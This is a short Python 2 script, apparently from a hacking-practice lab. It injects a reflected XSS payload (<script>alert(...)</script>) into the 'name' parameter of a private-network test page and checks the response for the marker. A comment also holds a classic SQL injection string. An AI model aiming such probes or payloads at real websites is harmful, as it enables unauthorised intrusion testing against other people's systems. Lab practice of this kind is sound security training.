#name = "  " or "1"="1    "
import requests
url="http://172.19.20.128/xss/example1.php?name=hacker"
indis=url.find("=")
print indis
url= url[:indis+1]+"<script>alert('pythonforhackers')</script>"
sonuc=requests.get(url)
if "pythonforhackers" in sonuc.content:
    print "XSS var,paylaod",str(url)